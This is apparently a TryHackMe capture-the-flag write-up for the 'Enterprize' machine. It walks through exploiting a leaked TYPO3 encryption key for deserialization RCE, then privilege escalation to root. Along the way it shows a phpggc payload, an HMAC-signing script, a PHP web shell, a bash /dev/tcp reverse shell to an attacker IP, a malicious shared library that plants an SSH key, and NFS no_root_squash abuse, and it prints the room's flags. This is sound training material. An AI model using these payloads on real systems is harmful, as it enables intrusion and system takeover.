
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

We need to add `enterprize.thm` to `/etc/hosts`:

```bash
echo '10.201.93.232 enterprize.thm' | sudo tee -a /etc/hosts
```

If we go to the web application, we notice this:

![Pasted image 20250801220902.png](../../IMAGES/Pasted%20image%2020250801220902.png)


Let's fuzz then:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://enterprize.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js,.json -fs 6765

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://enterprize.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js .json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6765
________________________________________________

index.html              [Status: 200, Size: 85, Words: 5, Lines: 2, Duration: 240ms]
.html                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 239ms]
.php                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 239ms]
public                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 239ms]
vendor                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 237ms]
```

Nothing can be found, weird, let's fuzz for `vhosts` then:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.201.93.232 -H "Host: FUZZ.enterprize.thm" -mc 200,301,302 -t 100 -ic -c -fs 85

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.93.232
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.enterprize.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response size: 85
________________________________________________

maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49, Duration: 6513ms]
```

We found one, let's add it to `/etc/hosts` and analyze it:

![Pasted image 20250801220907.png](../../IMAGES/Pasted%20image%2020250801220907.png)

Let's fuzz again:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://maintest.enterprize.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js,.json -fs 6765

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://maintest.enterprize.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js .json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6765
________________________________________________

.html                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 6749ms]
.php                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 7801ms]
index.php               [Status: 200, Size: 24555, Words: 1438, Lines: 49, Duration: 270ms]
fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8, Duration: 246ms]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8, Duration: 266ms]
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8, Duration: 245ms]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8, Duration: 245ms]
```

We found some interesting files on here, inside of `typo3conf`, we can find this:

![Pasted image 20250801220912.png](../../IMAGES/Pasted%20image%2020250801220912.png)

There's a `LocalConfiguration.old` file, it contains the following:

```php
<?php
return [
    'BE' => [
        'debug' => false,
        'explicitADmode' => 'explicitAllow',
        'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'DB' => [
        'Connections' => [
            'Default' => [
                'charset' => 'utf8mb4',
                'dbname' => 'typo3',
                'driver' => 'mysqli',
                'host' => '127.0.0.1',
                'password' => 'password1', //replaced old password by 24 random chars & symbols
                'port' => 3306,
                'tableoptions' => [
                    'charset' => 'utf8mb4',
                    'collate' => 'utf8mb4_unicode_ci',
                ],
                'user' => 'typo3user',
            ],
        ],
    ],
    'EXT' => [
        'extConf' => [
            'backend' => 'a:6:{s:14:"backendFavicon";s:0:"";s:11:"backendLogo";s:0:"";s:20:"loginBackgroundImage";s:0:"";s:13:"loginFootnote";s:0:"";s:19:"loginHighlightColor";s:0:"";s:9:"loginLogo";s:0:"";}',
            'bootstrap_package' => 'a:8:{s:20:"disableCssProcessing";s:1:"0";s:17:"disableFontLoader";s:1:"0";s:24:"disableGoogleFontCaching";s:1:"0";s:27:"disablePageTsBackendLayouts";s:1:"0";s:28:"disablePageTsContentElements";s:1:"0";s:16:"disablePageTsRTE";s:1:"0";s:20:"disablePageTsTCEFORM";s:1:"0";s:20:"disablePageTsTCEMAIN";s:1:"0";}',
            'extensionmanager' => 'a:2:{s:21:"automaticInstallation";s:1:"1";s:11:"offlineMode";s:1:"0";}',
            'indexed_search' => 'a:20:{s:8:"pdftools";s:9:"/usr/bin/";s:8:"pdf_mode";s:2:"20";s:5:"unzip";s:9:"/usr/bin/";s:6:"catdoc";s:9:"/usr/bin/";s:6:"xlhtml";s:9:"/usr/bin/";s:7:"ppthtml";s:9:"/usr/bin/";s:5:"unrtf";s:9:"/usr/bin/";s:18:"trackIpInStatistic";s:1:"2";s:9:"debugMode";s:1:"0";s:18:"fullTextDataLength";s:1:"0";s:23:"disableFrontendIndexing";s:1:"0";s:21:"enableMetaphoneSearch";s:1:"1";s:6:"minAge";s:2:"24";s:6:"maxAge";s:1:"0";s:16:"maxExternalFiles";s:1:"5";s:26:"useCrawlerForExternalFiles";s:1:"0";s:11:"flagBitMask";s:3:"192";s:16:"ignoreExtensions";s:0:"";s:17:"indexExternalURLs";s:1:"0";s:16:"useMysqlFulltext";s:1:"0";}',
        ],
    ],
    'EXTENSIONS' => [
        'backend' => [
            'backendFavicon' => '',
            'backendLogo' => '',
            'loginBackgroundImage' => '',
            'loginFootnote' => '',
            'loginHighlightColor' => '',
            'loginLogo' => '',
        ],
        'bootstrap_package' => [
            'disableCssProcessing' => '0',
            'disableFontLoader' => '0',
            'disableGoogleFontCaching' => '0',
            'disablePageTsBackendLayouts' => '0',
            'disablePageTsContentElements' => '0',
            'disablePageTsRTE' => '0',
            'disablePageTsTCEFORM' => '0',
            'disablePageTsTCEMAIN' => '0',
        ],
        'extensionmanager' => [
            'automaticInstallation' => '1',
            'offlineMode' => '0',
        ],
        'indexed_search' => [
            'catdoc' => '/usr/bin/',
            'debugMode' => '0',
            'disableFrontendIndexing' => '0',
            'enableMetaphoneSearch' => '1',
            'flagBitMask' => '192',
            'fullTextDataLength' => '0',
            'ignoreExtensions' => '',
            'indexExternalURLs' => '0',
            'maxAge' => '0',
            'maxExternalFiles' => '5',
            'minAge' => '24',
            'pdf_mode' => '20',
            'pdftools' => '/usr/bin/',
            'ppthtml' => '/usr/bin/',
            'trackIpInStatistic' => '2',
            'unrtf' => '/usr/bin/',
            'unzip' => '/usr/bin/',
            'useCrawlerForExternalFiles' => '0',
            'useMysqlFulltext' => '0',
            'xlhtml' => '/usr/bin/',
        ],
    ],
    'FE' => [
        'debug' => false,
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'LOG' => [
        'TYPO3' => [
            'CMS' => [
                'deprecations' => [
                    'writerConfiguration' => [
                        5 => [
                            'TYPO3\CMS\Core\Log\Writer\FileWriter' => [
                                'disabled' => true,
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ],
    'MAIL' => [
        'transport' => 'sendmail',
        'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',
        'transport_smtp_encrypt' => '',
        'transport_smtp_password' => '',
        'transport_smtp_server' => '',
        'transport_smtp_username' => '',
    ],
    'SYS' => [
        'devIPmask' => '',
        'displayErrors' => 0,
        'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
        'exceptionalErrors' => 4096,
        'features' => [
            'newTranslationServer' => true,
            'unifiedPageTranslationHandling' => true,
        ],
        'sitename' => 'EnterPrize',
        'systemLogLevel' => 2,
        'systemMaintainers' => [
            1,
        ],
    ],
];
```

We can notice the system encryption key at the bottom of the file, the `installtoolpassword` has been removed and the database password has been replaced so we need to work with that encryption key:

```php
'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
```

If we search for `typo3 encryptionkey`, we find an article about RCE with this:

![Pasted image 20250801220919.png](../../IMAGES/Pasted%20image%2020250801220919.png)

https://www.synacktiv.com/publications/typo3-leak-to-remote-code-execution

Let's begin exploitation.



# EXPLOITATION
---

We can check this on the article:

![Pasted image 20250801220923.png](../../IMAGES/Pasted%20image%2020250801220923.png)

![Pasted image 20250801220926.png](../../IMAGES/Pasted%20image%2020250801220926.png)

![Pasted image 20250801220931.png](../../IMAGES/Pasted%20image%2020250801220931.png)

![Pasted image 20250801220935.png](../../IMAGES/Pasted%20image%2020250801220935.png)

![Pasted image 20250801220940.png](../../IMAGES/Pasted%20image%2020250801220940.png)

We'll be dealing with HMAC unsafe deserialization that leads to RCE, we already know the encryption key the system uses, all we need now is some sort of contact form, we can find it here:

![Pasted image 20250801220956.png](../../IMAGES/Pasted%20image%2020250801220956.png)

There is our contact form, let's begin by getting `phpggc`:


```
git clone https://github.com/ambionics/phpggc
```


Now, we'll write into `fileadmin/_temp_/`, we need to check the `guzzle` version, we can go to `composer.json` to check this:

![Pasted image 20250801221005.png](../../IMAGES/Pasted%20image%2020250801221005.png)

`6,3` is our hit, let's use the tool now:

```php
./phpggc Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php backdoor.php -b --fast-destruct > payload.txt
```

Before sending the command, make sure you have this as `backdoor.php`:

```php
<?php $output = system($_GET[1]); echo $output ; ?>
```

We get our base64 payload:

```base64
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==
```


We need to create a simple php script to calculate the corresponding HMAC based on our encryption key, you can use this script:

```php
<?php
// Hardcoded encryption key from config file
$key = '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b';

// Replace this with your raw payload (base64 string output from phpggc)
$payload = 'PASTE_YOUR_BASE64_PAYLOAD_HERE';

// Generate the HMAC-SHA1 hash
$hmac = hash_hmac('sha1', $payload, $key, false);

// Print the result (you'll append this to the payload to complete the cookie)
echo "HMAC: " . $hmac . "\n";
?>
```

If we use the script, we'll get a hash:

```php
php hash_hmac_gen.php
HMAC: b8d837c2a4f1486f0d17b07727133d77a42580aa
```

Its time to send our malicious request, fill some random data on the form and use a proxy, you'll get a request like this:

![Pasted image 20250801221010.png](../../IMAGES/Pasted%20image%2020250801221010.png)

Based on the article, we need to modify the `__state` parameter, let's do it:

![Pasted image 20250801221016.png](../../IMAGES/Pasted%20image%2020250801221016.png)

Once we send the payload and go to 

```
http://maintest.enterprize.thm/fileadmin/_test_/backdoor.php?1=id
``` 

We get this:

![Pasted image 20250801221045.png](../../IMAGES/Pasted%20image%2020250801221045.png)

Since we got RCE, we can get a revshell now:

```
http://maintest.enterprize.thm/fileadmin/_temp_/backdoor.php?1=bash+-c+'bash+-i+>%26+/dev/tcp/IP/4444+0>%261'

http://maintest.enterprize.thm/fileadmin/_temp_/backdoor.php?1=bash+-c+'bash+-i+>%26+/dev/tcp/10.14.21.28/9001+0>%261'
```

I'll  use [penelope](https://github.com/brightio/penelope) here as my listener here:

```bash
penelope -i tun0 -p 9001
```

![Pasted image 20250801221052.png](../../IMAGES/Pasted%20image%2020250801221052.png)

Let's begin privesc.


# PRIVILEGE ESCALATION
---


We don't need to stabilize our shell thanks to penelope, let's use the privesc scripts this listener provides (which are linpeas and other scripts), you can use `f12` to enter the menu:

```bash
www-data@enterprize:/var/www/html/public/fileadmin/_temp_$
[!] Session detached ⇲

(../../IMAGES/Penelope)─(Session [1])> help

Session Operations
──────────────────
run      · [module name]             · Run a module. Run 'help run' to view the available modules
upload   · <glob|URL>...             · Upload files / folders / HTTP(S)/FTP(S) URLs to the target
download · <glob>...                 · Download files / folders from the target
open     · <glob>...                 · Download files / folders from the target and open them locally
maintain · [NUM]                     · Maintain NUM active shells for each target
spawn    · [Port] [Host]             · Spawn a new session.
upgrade  ·                           · Upgrade the current session's shell to PTY
exec     · <remote command>          · Execute a remote command
script   · <local_script|URL>        · In-memory local or URL script execution & real time downloaded output
portfwd  · host:port(<-|->)host:port · Local and Remote port forwarding

Session Management
──────────────────
sessions · [SessionID]      · Show active sessions or interact with the SessionID
use      · [SessionID|none] · Select a session
interact · [SessionID]      · Interact with a session
kill     · [SessionID|*]    · Kill a session
dir|.    · [SessionID]      · Open the session's local folder. If no session specified, open the base folder

Shell Management
────────────────
listeners  · [<add|stop>[-i <iface>][-p <port>]] · Add / stop / view Listeners
payloads   ·                                     · Create reverse shell payloads based on the active listeners
connect    · <Host> <Port>                       · Connect to a bind shell
Interfaces ·                                     · Show the local network interfaces

Miscellaneous
─────────────
help               · [command | -a]    · Show Main Menu help or help about a specific command
modules            ·                   · Show available modules
history            ·                   · Show Main Menu history
reset              ·                   · Reset the local terminal
reload             ·                   · Reload the rc file
SET                · [option, [value]] · Show / set option values
DEBUG              ·                   · Open debug console
exit|quit|q|Ctrl+D ·                   · Exit Penelope

(../../IMAGES/Penelope)─(Session [1])> help run

 run [module name]

    Run a module. Run 'help run' to view the available modules

  Privilege Escalation
  upload_privesc_scripts │ Upload a set of privilege escalation scripts to the target
  peass_ng               │ Run the latest version of PEASS-ng in the background
  lse                    │ Run the latest version of linux-smart-enumeration in the background
  linuxexploitsuggester  │ Run the latest version of linux-exploit-suggester in the background

  Misc
  meterpreter │ Get a meterpreter shell

  Pivoting
  ngrok │ Setup ngrok

(../../IMAGES/Penelope)─(Session [1])> run upload_privesc_scripts
[•] Download URL: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 ⤷ [########################################] 100% (933.8 KBytes/933.8 KBytes) | Elapsed 0:00:00
[+] Upload OK /var/www/html/public/fileadmin/_temp_/linpeas.sh

[•] Download URL: https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
 ⤷ [########################################] 100% (47.7 KBytes/47.7 KBytes) | Elapsed 0:00:00
[+] Upload OK /var/www/html/public/fileadmin/_temp_/lse.sh

[•] Download URL: https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh
 ⤷ [########################################] 100% (38.5 KBytes/38.5 KBytes) | Elapsed 0:00:00
[+] Upload OK /var/www/html/public/fileadmin/_temp_/deepce.sh
```

We can now use linpeas without the need of uploading it (saves some time):

![Pasted image 20250801221103.png](../../IMAGES/Pasted%20image%2020250801221103.png)

We can write inside of `/home/john/develop`, let's check the contents of it:

```bash
www-data@enterprize:/var/www/html/public/fileadmin/_temp_$ ls -la /home/john/develop
total 32
drwxrwxrwt 2 john john  4096 Jan  3  2021 .
drwxr-xr-x 7 john john  4096 Jan  9  2021 ..
-r-xr-xr-x 1 john john 16640 Jan  2  2021 myapp
-rw-rw-r-- 1 john john    44 Aug  1 21:44 result.txt
```

There is a `myapp` binary and `result.txt`:

```
www-data@enterprize:/var/www/html/public/fileadmin/_temp_$ cat /home/john/develop/result.txt
Welcome to my pinging application!
Test..

www-data@enterprize:/home/john/develop$ ./myapp
Welcome to my pinging application!
Test...
```

We can analyze the file in our machine using `base64` to decode it in our machine, something like this:

```
base64 /home/john/develop/myapp > /tmp/b64myapp
cat /tmp/b64myapp

echo 'b64 string' | base64 -d > myapp
```


Now if we open the file with `ghidra`, we can check this:

![Pasted image 20250801221110.png](../../IMAGES/Pasted%20image%2020250801221110.png)

![Pasted image 20250801221113.png](../../IMAGES/Pasted%20image%2020250801221113.png)

There's an import of `libcustom.so`:

![Pasted image 20250801221117.png](../../IMAGES/Pasted%20image%2020250801221117.png)

Let's check that, we need to use `strace` inside of our reverse shell:

```bash
www-data@enterprize:/home/john/develop$ strace ./myapp
execve("./myapp", ["./myapp"], 0x7ffdec6a3e70 /* 16 vars */) = 0
brk(NULL)                               = 0x556cee71b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=24489, ...}) = 0
mmap(NULL, 24489, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fc852dba000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/libcustom.so", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\20\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0775, st_size=15984, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc852db8000
mmap(NULL, 16432, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fc852db3000
mmap(0x7fc852db4000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7fc852db4000
mmap(0x7fc852db5000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7fc852db5000
mmap(0x7fc852db6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7fc852db6000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\20\35\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030928, ...}) = 0
mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fc8527a6000
mprotect(0x7fc85298d000, 2097152, PROT_NONE) = 0
mmap(0x7fc852b8d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7fc852b8d000
mmap(0x7fc852b93000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fc852b93000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc852db0000
arch_prctl(ARCH_SET_FS, 0x7fc852db0740) = 0
mprotect(0x7fc852b8d000, 16384, PROT_READ) = 0
mprotect(0x7fc852db6000, 4096, PROT_READ) = 0
mprotect(0x556ced5b3000, 4096, PROT_READ) = 0
mprotect(0x7fc852dc0000, 4096, PROT_READ) = 0
munmap(0x7fc852dba000, 24489)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0x556cee71b000
brk(0x556cee73c000)                     = 0x556cee73c000
write(1, "Welcome to my pinging applicatio"..., 35Welcome to my pinging application!
) = 35
write(1, "Test...\n", 8Test...
)                = 8
write(1, "\n", 1
)                       = 1
exit_group(0)                           = ?
+++ exited with 0 +++
```

`/usr/lib/libcustom.so` is our hit, let's check the write permissions and the configuration directory:

```bash
www-data@enterprize:/home/john/develop$ ls -la /usr/lib/libcustom.so
-rwxrwxr-x 1 john john 15984 Jan  2  2021 /usr/lib/libcustom.so

www-data@enterprize:/home/john/develop$ ls -lh /etc/ld.so.conf.d/
total 8.0K
-rw-r--r-- 1 root root  44 Jan 27  2016 libc.conf
lrwxrwxrwx 1 root root  28 Jan  3  2021 x86_64-libc.conf -> /home/john/develop/test.conf
-rw-r--r-- 1 root root 100 Apr 16  2018 x86_64-linux-gnu.conf
```

There's a symlink from the configuration file to `/home/john/develop/test.conf`, the file doesn't exist, bus since we can write to this location, we can create it, what we need to do here is to abuse the `libcustom.so` to create a `libcustom.c` file that will execute any command we want as `john`.

### Disclaimer

By 2025 (Or at least the date I did the machine (August), you can't get a revshell, and to be honest, I have no clue why, the cronjob triggers but you simply don't get the connection back, for the PE path we'll proceed with another method).

Ok, let's develop a script to embed a `ssh` key into john's `.ssh` directory, we can do the following:

```
ssh-keygen -f id_rsa_john -N ""
```

Once you have the key, create the `.c` file with this:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void hack(void){
    // The key you generated earlier
    const char *key = "REPLACE WITH YOUR id_rsa_john.pub FILE CONTENTS";

    // Create .ssh directory if it doesn't exist
    system("mkdir -p /home/john/.ssh");

    // Append the SSH public key
    FILE *f = fopen("/home/john/.ssh/authorized_keys", "a");
    if (f == NULL) return;
    fprintf(f, "%s\n", key);
    fclose(f);

    // Set correct permissions
    system("chown -R john:john /home/john/.ssh");
    system("chmod 700 /home/john/.ssh");
    system("chmod 600 /home/john/.ssh/authorized_keys");
}
```

Now we need to compile it:

```
gcc -shared -o libcustom.so -fPIC libcustom.c
```

Once we got our file, we need to upload it and write into the symlink:

```
wget http://IP:8000/libcustom.c
echo '/home/john/develop' > /home/john/develop/test.conf
```

Now simply wait until the cronjob triggers and you'll be able to access ssh as john:

![Pasted image 20250801221144.png](../../IMAGES/Pasted%20image%2020250801221144.png)


This was the only way I was able to get a shell on here:

![Pasted image 20250801221147.png](../../IMAGES/Pasted%20image%2020250801221147.png)

Let's run linpeas again:

![Pasted image 20250801221151.png](../../IMAGES/Pasted%20image%2020250801221151.png)

We can exploit the `no_root_squash` on NFS, In an NFS (Network File System) environment, the `no_root_squash` option in the `/etc/exports` file is a potentially dangerous configuration that allows the root user on a remote client to retain their root privileges when accessing the shared directory. Normally, NFS applies `root_squash`, which maps remote root user requests to the less-privileged `nobody` user on the server to prevent privilege abuse. However, when `no_root_squash` is enabled, a user mounting the export as root can create files and execute commands on the NFS server as root, making it a prime target for privilege escalation in a CTF. For more information on `no_root_squash` privesc, go to:

https://juggernaut-sec.com/nfs-no_root_squash/

https://medium.com/@kumarishefu.4507/try-hack-me-write-up-privilege-escalation-linux-privesc-nfs-capstone-challenge-dd69599dcbfa


Let's forward rpc and nfs:

```bash
sudo ssh -L 2049:localhost:2049 -L 111:localhost:111 -i id_rsa_john john@enterprize.thm
```

Now inside of our machine, we need to copy the `/bin/bash` binary to `/var/nfs/:

```
cp /bin/bash /var/nfs/
```

Now, go back to your host machine and create a `nfs` directory and do:

```bash
mkdir nfs

sudo mount -o rw,vers=4 -t nfs localhost:/var/nfs nfs
```

If we check the `nfs` directory, we notice `bash` on here:

```
ls -la nfs
.rwxr-xr-x@ 1.1M kali  2 Aug 00:18 bash
```

We need to give that binary root SUID, switch to root and do:

```bash
chown root:root bash
chmod +xs bash
ls -la
total 1092
drwxr-x--- 2 samsepiol kali    4096 Aug  2 00:18 .
drwxr-xr-x 1 samsepiol kali     170 Aug  2 00:16 ..
-rwsr-sr-x 1 root      root      1113504 Aug  2 00:18 bash
```

Nice, time to go back to our ssh session to check if the binary's there:

```
john@enterprize:/tmp$ cd /var/nfs
john@enterprize:/var/nfs$ ls -la
total 1096
drwxr-x---  2 john john    4096 Aug  2 00:18 .
drwxr-xr-x 15 root root    4096 Jan  3  2021 ..
-rwsr-sr-x  1 root root 1113504 Aug  2 00:18 bash
```

We got it, we can simply use the bash binary to get root access and finish the CTF:

```
john@enterprize:/var/nfs$ ./bash -p
bash-4.4# whoami
root
```

![Pasted image 20250801221157.png](../../IMAGES/Pasted%20image%2020250801221157.png)

Flags are:

```
bash-4.4# cat /home/john/user.txt
THM{a99acf52687be464db48eca3b3359572}

bash-4.4# cat /root/root.txt
THM{568a171c9460d2b3871618b9d5232919}
```

![Pasted image 20250801221200.png](../../IMAGES/Pasted%20image%2020250801221200.png)


